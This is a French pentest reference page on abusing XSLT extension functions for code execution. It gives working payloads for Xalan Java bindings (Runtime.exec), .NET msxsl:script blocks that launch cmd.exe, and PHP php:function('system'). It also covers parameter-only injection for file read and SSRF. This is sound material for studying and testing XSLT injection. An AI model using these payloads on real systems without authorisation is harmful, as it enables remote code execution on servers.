---
title: "Abus de fonctions d'extension : exécution de code dans le runtime de transformation"
description: "Les fonctions d'extension Java et .NET et les blocs xsl:script / msxsl:script intégrés exécutent du code du runtime hôte quand une feuille de style ou ses paramètres sont influencés par l'attaquant."
keywords:
  - fonctions d'extension XSLT
  - xsl:script
  - msxsl:script
  - liaison Java Xalan
  - RCE XSLT
---

# Abus de fonctions d'extension

Les moteurs XSLT côté serveur permettent à une feuille de style d'appeler le runtime hôte : la JVM via des liaisons de classes Java, .NET via des types CLR, et les deux via des blocs de script intégrés. Lorsque l'un de ceux-ci atteint un texte de feuille de style influencé par l'attaquant, la transformation cesse d'être une projection de données et devient une exécution de code dans le processus qui l'exécute. Le mécanisme disponible est spécifique au moteur, donc la charge utile suit l'empreinte renvoyée par `system-property('xsl:vendor')`.

## Fonctions d'extension Java (Xalan, Saxon-B)

Xalan mappe un préfixe d'espace de noms vers une classe Java et laisse la feuille de style l'instancier et appeler ses méthodes. Un nouveau `java.lang.Runtime` exécute une commande arbitraire :

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rt, 'id')"/>
  </xsl:template>
</xsl:stylesheet>
```

Relire la sortie du processus exige d'envelopper le flux `Process` renvoyé, communément via `java.io.InputStreamReader` et `java.util.Scanner` liés de la même façon, pour que le résultat de la commande atterrisse dans la sortie de la transformation.

## Scripts intégrés (.NET, MSXML)

Le `XslCompiledTransform` de .NET compile les blocs `msxsl:script` quand le scripting est activé, exécutant du C# ou du JScript à l'intérieur de la transformation :

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:user="urn:user">
  <msxsl:script language="C#" implements-prefix="user">
    public string run() {
      return new System.Diagnostics.Process {
        StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe","/c whoami"){
          RedirectStandardOutput = true, UseShellExecute = false }
      }.Start().ToString();
    }
  </msxsl:script>
  <xsl:template match="/"><xsl:value-of select="user:run()"/></xsl:template>
</xsl:stylesheet>
```

Le libxslt de PHP expose la liaison parallèle `php:function` quand `registerPHPFunctions()` est autorisé, appelant n'importe quelle fonction PHP y compris `system` ou `file_get_contents` :

```xml
<xsl:value-of select="php:function('system','id')"/>
```

## Influence par paramètre uniquement

L'exécution de code complète nécessite le contrôle de la feuille de style, mais là où seul un paramètre est fourni par l'attaquant la surface accessible reste large : un paramètre injecté inséré dans un attribut `xsl:value-of select` exécute du XPath choisi par l'attaquant, ce qui atteint chaque fonction d'extension enregistrée que la feuille de style importe déjà. Si cette feuille de style déclare une liaison Java ou PHP, le paramètre seul l'appelle, et sinon le paramètre pilote `document()` et `unparsed-text()` pour la lecture de fichier et le SSRF. Énumérer les espaces de noms déclarés avec `system-property()` et sonder quels préfixes se résolvent montre quel pont de runtime est actif avant de s'engager dans une charge utile complète.

## Outils

- **Burp Repeater** : livraison de feuilles de style à fonctions d'extension et à scripts intégrés.
- Tests manuels avec des charges utiles de liaison Java Xalan, `msxsl:script` et `php:function`.
- Identification manuelle du moteur avec `system-property('xsl:vendor')`.

## Références

- [Apache Xalan: Extension Functions](https://xml.apache.org/xalan-j/extensions.html)
- [Microsoft: Script Blocks Using msxsl:script](https://learn.microsoft.com/en-us/dotnet/standard/data/xml/script-blocks-using-msxsl-script)
- [PayloadsAllTheThings: XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md)
